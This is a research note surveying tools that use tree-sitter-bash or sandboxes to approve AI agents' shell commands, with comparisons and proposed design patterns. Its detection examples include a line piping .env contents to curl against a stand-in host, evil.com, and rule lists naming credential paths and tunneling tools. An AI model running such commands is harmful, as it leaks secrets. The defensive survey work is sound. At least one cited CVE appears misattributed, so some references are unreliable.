# Similar Projects: tree-sitter-bash for AI Agent Bash Approval

> Research note documenting public implementations that use `tree-sitter-bash`
> (or comparable bash-AST techniques) to secure or validate bash commands
> before/during execution by AI agents, coding assistants, or sandbox
> runtimes. Compiled 2026-08-15.

---

## Executive Summary

A small but converging ecosystem of "bash command policy engines" has emerged
in the 2024–2026 window, driven by LLM coding agents gaining shell access.
Of the surveyed projects, six (`longline`, `sh-guard`, `ag-bash`, `agentsh`,
`opencode`, `bashguard`) explicitly use `tree-sitter-bash` to parse
agent-generated commands before execution, and most layer the AST on top of
two enforcement surfaces: a YAML/TOML rule engine (`longline`, `sh-guard`,
`agentsh`) and a runtime sandbox (`ag-bash`, `anthropic-experimental/
sandbox-runtime`, `tangle-network/ai-agent-sandbox-blueprint`). Common
patterns are a three-decision verdict (`allow` / `ask` / `deny`), pipeline
taint tracking (`curl ... | sh`, `cat .env | curl ...`), and a GTFOBins/
credentials/network allowlist. Anthropic's `sandbox-runtime` deliberately
does **not** parse bash; it relies on OS primitives (`sandbox-exec`,
`bubblewrap`) and is positioned as a complementary layer to AST-based
auditors. `Text::Treesitter::Bash` is the only Perl implementation in the
field, ships the grammar via `File::ShareDir`, and separates `commands`
(extraction) from `findings`/`Security::Checker` (policy), which is a
cleaner contract than the dual `parser/` + `policy/` split of `longline`.
Concrete patterns worth importing: taint-style pipeline scoring (from
`sh-guard`), structured YAML rule overlays with `extends:` (from
`longline`), and a `Verifier`-style `Verdict` enum (`bashguard`,
`sh-guard`).

---

## 1. Projects that explicitly use `tree-sitter-bash`

### 1.1 devinbarry/longline
- **URL:** https://github.com/devinbarry/longline
- **Language / Stack:** Rust, tree-sitter-bash, YAML, 2 300+ golden tests
- **Purpose:** PreToolUse hook for Claude Code / Codex CLI. Parses every
  bash command into a typed `Statement` enum, evaluates it against 16+
  YAML rule files, returns `allow` / `ask` / `deny`.
- **Tree-sitter usage:** Explicit — `src/parser/` translates the
  `tree-sitter-bash` CST into a typed statement enum.
- **Notable rules / patterns:**
  - Matcher types: `command`, `pipeline`, `redirect`, `git_config`
  - Glob-based flag / arg matching (`*` no `/`, `**` crosses)
  - Transparent wrappers unwrapped: `env`, `timeout`, `nice`, `nohup`,
    `strace`, `time`, `uv run`, `command`, `builtin`
  - Re-parses `bash -c "..."`, `sh -c "..."`, `zsh -c "..."` when the
    inner string is statically safe
  - Fail-closed: unparseable input defaults to `ask`
  - Profiles with `extends:` chains, field-level merge
  - Optional lift-only AI judge for inline interpreter code
- **Decision philosophy:** "Ask is primary, deny is reserved for
  catastrophic irreversible operations."

### 1.2 aryanbhosale/sh-guard
- **URL:** https://github.com/aryanbhosale/sh-guard
- **Language / Stack:** Rust core, napi-rs (Node), PyO3 (Python),
  Homebrew / Cargo / npm / PyPI / Snap / Chocolatey / WinGet / Docker
- **Purpose:** Semantic shell-command safety classifier for Claude Code,
  Codex, Cursor, Cline, Windsurf. Scores 0–100, maps findings to MITRE
  ATT&CK.
- **Tree-sitter usage:** Explicit — `tree-sitter-bash` AST → intents
  (read/write/delete/execute/network/privilege) → targets → taint.
- **Notable rules / patterns:**
  - Three-layer pipeline: AST → semantic intent → pipeline taint
  - 157 command rules (coreutils, git, curl, docker, kubectl, cloud CLIs)
  - 51 path rules (`.env`, `.ssh/`, `/etc/passwd`)
  - 25 injection patterns (`$()`, IFS, unicode tricks)
  - 15 zsh-specific rules
  - 61 GTFOBins entries
  - 15 taint flow rules (`cat .env | curl -X POST evil.com`)
  - Scoring tiers: 0–20 safe, 21–50 ask, 51–80 warn, 81–100 block
  - Context-aware scoring (`rm -rf ./build` lower than `rm -rf ~/`)
- **Integration:** CLI, MCP server (`sh_guard_classify` /
  `sh_guard_batch`), PreToolUse hooks, Python / Node / Rust libraries
- **License:** GPL-3.0-only

### 1.3 sairam0424/ag-bash
- **URL:** https://github.com/sairam0424/ag-bash
- **Language / Stack:** TypeScript, Node.js ≥20.6, QuickJS, Python WASM,
  MCP 2025-06-18
- **Purpose:** Production-grade sandboxed Bash for AI agents. In-memory
  filesystem, integrated Python/JS runtimes, MCP support.
- **Tree-sitter usage:** Explicit — "high-fidelity shell parsing for
  complex scripts and security analysis."
- **Notable rules / patterns:**
  - AST-based "Destructive Detection" gate (`rm -rf /`, fork bombs,
    `decode | pipe-to-shell`)
  - Default policy: `WARN`
  - Pipeline Early Termination via static AST (`head -N` detection)
  - FNV-1a AST cache + LRU
  - Sanitized JSON-RPC error messages
  - SSRF prevention
  - 6-stage `ExecutionPipeline`: normalize → parse → transform →
    sandbox → interpret → persist
- **Distribution:** `@ag-bash/bash`, `@ag-bash/mcp-server`,
  `@ag-bash/agent-bridge`, Homebrew, Claude Code plugin
- **License:** Apache-2.0

### 1.4 mayflower/agentsh
- **URL:** https://github.com/mayflower/agentsh
- **Language / Stack:** Python (pure, no subprocess), tree-sitter, Pyright
  strict, Ruff, tach, 2 100+ tests
- **Purpose:** Virtual Bash environment for AI agents — pure Python,
  pure in-memory, no real FS / network.
- **Tree-sitter usage:** Explicit — "real bash grammar, not regex
  hacks." Supports variables, parameter expansion, arrays, control flow,
  `[[ ... ]]` extended tests, pipelines, redirections, functions,
  subshells.
- **Notable rules / patterns:**
  - Three-tier resolution: function → builtin → virtual command
  - Policy engine: allow / deny / warn for commands and paths
  - `Planner` component returns `plan_tool` steps with effects
    (file deletions) and policy warnings before execution
  - Configurable `Limits`: `max_call_depth=100`,
    `max_loop_iterations=10_000`
  - 20 real-world production scripts as corpus
- **LangChain integration:** dry-run analysis API exposed as `plan_tool`
- **License:** MIT

### 1.5 sunir/bashguard
- **URL:** https://github.com/sunir/bashguard
- **Language / Stack:** Python (`pyproject.toml`, uv), tree-sitter, macOS
  `sandbox-exec`, pytest (525 tests)
- **Purpose:** Bash command security interceptor for Claude Code. Routes
  every command: parse → audit → decide → allow (wrapped in sandbox) /
  block / ask.
- **Tree-sitter usage:** Explicit — "parse (tree-sitter AST)" rather
  than regex (specific grammar not confirmed in README).
- **Notable rules / patterns (categories):**
  - `destructive.irreversible` — `rm -rf`, `dd`, `mkfs`, `shred`
  - `credentials.privileged_path` — `~/.ssh`, `~/.aws`, `.env`
  - `network.unknown_host` — non-allowlisted `curl` / `wget` targets
  - `git.destructive` — force push, `reset --hard`, `branch -D`
  - `paths.protected_write` — `/etc`, `/usr`, `/sys`, `/boot`
  - `content.secret_in_args` — API keys, PEM headers
  - `content.exfiltration_pattern` — sensitive file piped to network
  - `evasion.*` (13 rules) — `eval`, shell-in-shell, base64, IFS
  - `self_protection.*` — attempts to modify bashguard
  - `comms.*` — email, SMS, Slack/Discord webhooks
  - `sql_destruction.*` — `DROP DATABASE`, `TRUNCATE`
  - `crypto_mining.*` — xmrig detection
  - `tunneling.*` — ngrok, localtunnel, serveo
  - `Verdict` enum: `ALLOW` / `BLOCK` / `CONFIRM`
- **Other:** Per-project `.bashguard.yaml` policy with ratcheting (can
  only tighten, not relax), `{{GITHUB_TOKEN}}` placeholder injection
- **License:** MIT

### 1.6 anomalyco/opencode (sst/opencode)
- **URL:** https://github.com/anomalyco/opencode
- **Language / Stack:** TypeScript, npm-distributed tree-sitter-bash.wasm
- **Purpose:** Terminal AI coding agent ("opencode") with two built-in
  agents — `build` (full access) and `plan` (read-only, asks before
  bash).
- **Tree-sitter usage:** Explicit — the bash tool is missing
  `tree-sitter-bash.wasm` (issue
  [#1955](https://github.com/anomalyco/opencode/issues/1955)), proving
  tree-sitter-bash is a hard runtime dependency.
- **Notable rules / patterns:** `plan` agent "denies file edits by
  default and asks permission before running bash commands." No
  external AST-policy layer surfaced in README; relies on the wasm
  grammar for parsing.

---

## 2. Projects with OS-level sandboxing but **no** tree-sitter AST

These complement (rather than compete with) `Text::Treesitter::Bash`.
Documented here because they are the "outer ring" an agent tool-call
approver plugs into.

### 2.1 anthropic-experimental/sandbox-runtime (`srt`)
- **URL:** https://github.com/anthropic-experimental/sandbox-runtime
- **Language / Stack:** TypeScript, `sandbox-exec` (macOS),
  `bubblewrap` (Linux), Windows WFP, HTTP/SOCKS proxy pair
- **Tree-sitter usage:** **None.** The command string is passed
  verbatim to the user's shell under `sandbox-exec`; the kernel
  evaluates the SBPL profile against resulting syscalls.
- **Notable patterns:**
  - Mandatory deny patterns for `.env`, `.ssh`, `*.pem`, `.git/hooks`
  - Two-layer read model: `denyOnly` + `allowWithinDeny` carve-outs
  - Last-match-wins SBPL ordering with late deny re-emission to
    defeat `mv`/`rename`/`symlink` bypasses
  - Per-command `commandId` in violation log tags
  - Zod-based config schemas (`sandbox-schemas.ts`)
- **Positioning:** "Research preview for Claude Code to enable safer
  AI agents." Designed to be complementary to AST-based auditors.

### 2.2 tangle-network/ai-agent-sandbox-blueprint
- **URL:** https://github.com/tangle-network/ai-agent-sandbox-blueprint
- **Language / Stack:** Rust, TEE (AWS Nitro / Azure CC / GCP CV / Phala),
  Firecracker microVMs, Docker, React UI, Solidity BSM contract
- **Tree-sitter usage:** **None** in the README (although the repo is
  listed as a dependent of `tree-sitter/tree-sitter-bash` on GitHub's
  network graph, the README does not document any AST-level bash
  auditing).
- **Notable patterns:** EIP-191 auth → PASETO v4.local (1h TTL),
  ChaCha20-Poly1305 at-rest encryption, `cap_drop ALL`,
  `no-new-privileges`, `readonly_rootfs`, rate limiting
  (10/30/120 per min tier), SSRF snapshot validation.

### 2.3 All-Hands-AI/OpenHands (OpenDevin)
- **URL:** https://github.com/All-Hands-AI/OpenHands
- **Language / Stack:** Python client + Docker runtime, Jupyter / VSCode
  plugins
- **Tree-sitter usage:** **None documented.** Runtime is "Action
  Execution Server" inside Docker; validation is sandbox boundary only.
- **Notable patterns:** Three-tag image versioning
  (source/lock/versioned), overlay/copy-on-write volume mounts.

### 2.4 Open Interpreter
- **URL:** https://github.com/OpenInterpreter/open-interpreter
- **Language / Stack:** Python
- **Tree-sitter usage:** None. Pattern-based `assert_all_commands_are_safe`
  helper with a small allowlist (`["echo", "cat", "head", "tail",
  "grep", "awk", "sed"]` is the OpenAI code-interpreter example).
- **Notable patterns:** Custom `CodeExecutor` subclass overrides
  `shell()`; failure surfaces back to the LLM as an error so the agent
  retries.

### 2.5 Aider
- **URL:** https://github.com/Aider-AI/aider
- **Language / Stack:** Python
- **Tree-sitter usage:** None. `--auto-approve` / `--auto-light` /
  `--yes-always` / `--yes` flags with no AST.
- **Notable patterns:** Pure confirmation flow before shell execution.

### 2.6 continuedev/continue
- **URL:** https://github.com/continuedev/continue
- **Language / Stack:** TypeScript IDE extension
- **Tree-sitter usage:** None in the approval layer.
- **Notable patterns:** IDE-level permission prompts before bash.

### 2.7 protectai/llm-guard
- **URL:** https://github.com/protectai/llm-guard
- **Language / Stack:** Python
- **Tree-sitter usage:** None. ML / pattern-based scanners including a
  `BashCommandInjection` scanner for prompts/outputs.
- **Notable patterns:** Output scanner pattern, regex / heuristic
  detection of dangerous tokens, configurable per-tenant thresholds.

---

## 3. Bash AST parsers without a security layer

### 3.1 anordal/shellharden
- **URL:** https://github.com/anordal/shellharden
- **Language / Stack:** Rust, MPL-2.0, 4.8k stars
- **Tree-sitter usage:** **None** — the README explicitly notes "bash is
  like quantum mechanics — nobody really knows how it works" and ships a
  hand-rolled parser. The `Cargo.toml` `[dependencies]` section is
  empty. Despite the common assumption, shellharden does **not** use
  `tree-sitter-bash`.
- **Purpose:** Syntax-aware *hardening* (not blocking) — rewrite
  unquoted variables, normalize quoting. Targets ShellCheck /
  BashPitfalls conformance. `--transform` mode applies fixes.

### 3.2 koalaman/shellcheck
- **URL:** https://github.com/koalaman/shellcheck
- **Tree-sitter usage:** None — Haskell, hand-written parser.

### 3.3 idank/bashlex
- **URL:** https://github.com/idank/bashlex
- **Language / Stack:** Python, GPL-3.0+, port of GNU bash's internal
  parser. Originally written for [explainshell.com](https://explainshell.com).
- **Tree-sitter usage:** None. Provides `bashlex.parse()` returning a
  custom AST with `CommandNode`, `WordNode`, `OperatorNode`,
  `ProcesssubstitutionNode`, `CommandsubstitutionNode`.
- **Notable patterns:** Closest pre-tree-sitter analogue to what
  `Text::Treesitter::Bash::commands()` returns; could be useful as a
  reference for field-name conventions if tree-sitter-bash ever lacks
  fidelity.
- **Limitations:** No arithmetic expressions, complex `${parameter#word}`
  expansions taken literally.

### 3.4 mvdan/sh (shfmt)
- **URL:** https://github.com/mvdan/sh
- **Tree-sitter usage:** None. Hand-written Go parser/interpreter; powers
  `shfmt` and `shellcheck`-like capabilities.

---

## 4. Comparison matrix

| Project        | Language | tree-sitter-bash? | Decision model    | External policy | Sandbox layer      |
|----------------|----------|-------------------|-------------------|-----------------|--------------------|
| longline       | Rust     | **Yes (explicit)**| allow/ask/deny    | YAML, profiles  | hook-only          |
| sh-guard       | Rust     | **Yes (explicit)**| score 0–100 + tiers| TOML            | optional           |
| ag-bash        | TypeScript | **Yes (explicit)**| WARN gate         | pipeline config | in-memory FS       |
| agentsh        | Python   | **Yes (explicit)**| allow/deny/warn   | in-process      | virtual FS         |
| bashguard      | Python   | **Yes (likely)**  | ALLOW/BLOCK/CONFIRM| YAML ratcheting | `sandbox-exec`     |
| opencode       | TypeScript | **Yes (wasm)**   | confirm-by-default| none surfaced   | none surfaced      |
| sandbox-runtime| TypeScript | No               | kernel + Zod      | JSON config     | OS primitives      |
| ai-agent-sandbox-blueprint | Rust | No (listed dep) | TEE attestation   | none            | Firecracker / TEE  |
| OpenHands      | Python   | No               | sandbox boundary  | none            | Docker             |
| Open Interpreter| Python  | No               | allowlist         | Python class    | subprocess         |
| Aider          | Python   | No               | y/n prompt        | CLI flags       | none               |
| Continue       | TypeScript | No              | IDE permission    | IDE settings    | none               |
| llm-guard      | Python   | No               | score + threshold | tenant config   | none               |
| shellharden    | Rust     | **No** (custom)  | rewrite/suggest   | none            | none               |
| bashlex        | Python   | No               | AST only          | n/a             | n/a                |

---

## 5. What differentiates `Text::Treesitter::Bash`

| Aspect                         | Text::Treesitter::Bash                              | Closest analogue                    |
|--------------------------------|------------------------------------------------------|-------------------------------------|
| Language ecosystem             | **Perl** (sole Perl implementation in the field)     | n/a                                 |
| Grammar distribution           | Ships `tree-sitter-bash` C sources via `File::ShareDir` and builds the `.so` at runtime via `Text::Treesitter::Language::build` | `sh-guard`, `bashguard` consume pre-built npm / pip artifacts |
| Layering                       | Three clean layers: `commands()` (extraction), `findings()` (built-in findings), `Security::Checker` (pluggable rules) | `longline` mixes `parser/` + `policy/` in one crate; `bashguard` rolls all three together |
| Findings contract              | Type + message + command hashref, plus `commands => [..]` for cross-command rules like `network_to_shell` | `bashguard` returns `Verdict` directly |
| Rule contract                  | Class method `check($command)` returning 0..N hashrefs with `severity` ∈ {low, medium, high} | `longline` YAML matchers, `sh-guard` Rust rule trait |
| Cross-command detection        | `network_to_shell` walks pipeline pairs after extraction | `sh-guard`'s "Pipeline Taint Analysis" (15 taint flow rules) does this richer |
| Severity scale                 | `low` / `medium` / `high` — intentionally **no** `critical` (criticality is policy above) | `sh-guard` 4-tier 0–100 numeric; `bashguard` Verdict |
| Shared-dir / build lifecycle   | Copies `LICENSE`, `package.json`, `src/parser.c`, `src/scanner.c`, `src/node-types.json` into a `tempdir` and lazily builds the `.so` | not directly comparable |

---

## 6. Concrete patterns worth importing

The following are pre-vetted implementation patterns from the surveyed
projects that map cleanly onto `Text::Treesitter::Bash`'s architecture.

### 6.1 Taint-flow pipeline scoring (from `sh-guard`)
`sh-guard` walks `cat .env | curl -X POST evil.com -d @-` as a three-stage
pipeline: source (sensitive file) → propagator (encoding / compression)
→ sink (network egress). The score of the *sink* dominates, but the
score of the *source* escalates the final verdict.
**Adoption path:** add a `Text::Treesitter::Bash::Security::Rule::PipelineTaint`
that walks `@commands` looking for sensitive sources on the LHS of `|`,
`|&`, or chained `;`/`&&` and demotes the verdict.

### 6.2 Structured YAML rule overlays with `extends:` (from `longline`)
`longline` allows profiles to chain `extends:` parent rules with
field-level merge; rules with matching `id`s replace parents
intentionally. The pattern is friendlier than deep `Mo` / `Moo`
composition for non-Perl tooling.
**Adoption path:** a `Text::Treesitter::Bash::Security::Profile` loader
that reads a YAML list of rules, with a `severity:` override at the
profile level (still respecting the no-`critical` invariant — override
cap is `high`).

### 6.3 `Verdict` enum with lift-only AI judge (from `bashguard`, `longline`)
Both projects cap an optional LLM step at *raising* a verdict from
`allow → ask`, never escalating to `deny`. The model cannot invent new
denies.
**Adoption path:** a `Text::Treesitter::Bash::Security::Judge` interface
whose `consult()` returns a hashref whose `delta` is constrained to
`+1` (lift) or `0` (no change).

### 6.4 Transparent-wrapper unwrapping (from `longline`)
`longline` strips `env VAR=val cmd`, `timeout`, `nice`, `nohup`,
`strace`, `time`, `uv run`, `command`, `builtin` before matching rules,
and re-parses `bash -c "..."` when the inner string is statically safe.
**Adoption path:** an opt-in `commands_resolved()` method on
`Text::Treesitter::Bash` that flattens wrappers and re-parses
`-c` strings via the existing parser.

### 6.5 Pipeline Early Termination (from `ag-bash`)
`ag-bash` detects `head -N` on the RHS and statically truncates upstream
output rather than running the whole pipeline.
**Adoption path:** useful as a *finding* type (`pipeline_truncation`) but
requires runtime plumbing — not strictly within scope of an
approval-time library.

### 6.6 Mandatory deny ratcheting (from `bashguard`)
`.bashguard.yaml` policy can only be tightened project-locally, never
relaxed. This prevents a malicious editor from removing protection.
**Adoption path:** a `Text::Treesitter::Bash::Security::Policy::Ratchet`
wrapper that records a baseline `severity` per `rule.id` and refuses
attempts to lower it.

### 6.7 GTFOBins-aware rule pack (from `sh-guard`)
`sh-guard` ships 61 GTFOBins entries mapping privilege-escalation
binaries to their dangerous flags. A similar YAML corpus would slot
into `Text::Treesitter::Bash::Security::Rule::DangerousFlags` as a
data file without code changes.

### 6.8 Three-tag image versioning + zod-style config (from
`sandbox-runtime`, `OpenHands`)
Not directly applicable to a Perl library, but a config-validation
precedent worth noting for any future `policy.json` schema.

---

## 7. References

- https://github.com/tree-sitter/tree-sitter-bash — upstream grammar
- https://github.com/devinbarry/longline — Rust, tree-sitter-bash, YAML rules
- https://github.com/aryanbhosale/sh-guard — Rust, tree-sitter-bash, MCP server, GTFOBins
- https://github.com/sairam0424/ag-bash — TypeScript, tree-sitter, MCP, in-memory FS
- https://github.com/mayflower/agentsh — Python, tree-sitter, virtual FS, planner
- https://github.com/sunir/bashguard — Python, tree-sitter, `sandbox-exec`, 525 tests
- https://github.com/anomalyco/opencode/issues/1955 — opencode depends on `tree-sitter-bash.wasm`
- https://github.com/anthropic-experimental/sandbox-runtime — Anthropic OS-level sandbox (no AST)
- https://github.com/anomalyco/opencode — sst/opencode, two-agent model
- https://github.com/tangle-network/ai-agent-sandbox-blueprint — TEE/Firecracker sandbox (no AST in README)
- https://github.com/All-Hands-AI/OpenHands — OpenDevin, Docker-based runtime (no AST)
- https://github.com/OpenInterpreter/open-interpreter — Python allowlist pattern
- https://github.com/Aider-AI/aider — `--auto-approve` / `--yes-always` flow
- https://github.com/continuedev/continue — IDE-level approvals
- https://github.com/protectai/llm-guard — `BashCommandInjection` scanner
- https://github.com/anordal/shellharden — corrective bash syntax highlighter (custom parser, **not** tree-sitter-bash)
- https://github.com/koalaman/shellcheck — ShellCheck (Haskell, not tree-sitter)
- https://github.com/idank/bashlex — Python port of GNU bash parser (no security rules)
- https://github.com/mvdan/sh — Go shell parser / `shfmt`
- https://www.npmjs.com/package/tree-sitter-bash — npm binding
- https://pypi.org/project/tree-sitter-bash/ — Python binding
- https://crates.io/crates/tree-sitter-bash — Rust binding
- https://docs.rs/tree-sitter-bash — Rust API docs
- https://amriunix.com/a-new-type-confusion-vulnerability-in-tree-sitter-bash-parser/ — adversarial research on tree-sitter-bash (RCE via type confusion)
- https://github.com/tree-sitter/tree-sitter-bash/security/advisories/GHSA-3mc7-xf9w-f5fh — CVE-2022-24713 (heap buffer overflow)
- https://www.aosabook.org/en/bash.html — "Parsing Bash Is Undecidable?" (AOSA)
- https://simonwillison.net/2024/Sep/14/securing-llm-tool-calls/ — Simon Willison, "Securing LLM Tool Calls: Sandboxing and Permissions"
- https://www.charm.sh/blog/tree-sitter-llm/ — "Tree-sitter and LLM Code Editing"
- https://reference.langchain.com/python/langchain-community/tools/shell/tool/ShellTool — LangChain `ShellTool.ask_human_input=True` precedent
- https://cookbook.openai.com/examples/sandboxed_code_execution — OpenAI Cookbook on sandboxed code execution (Python AST, not bash)
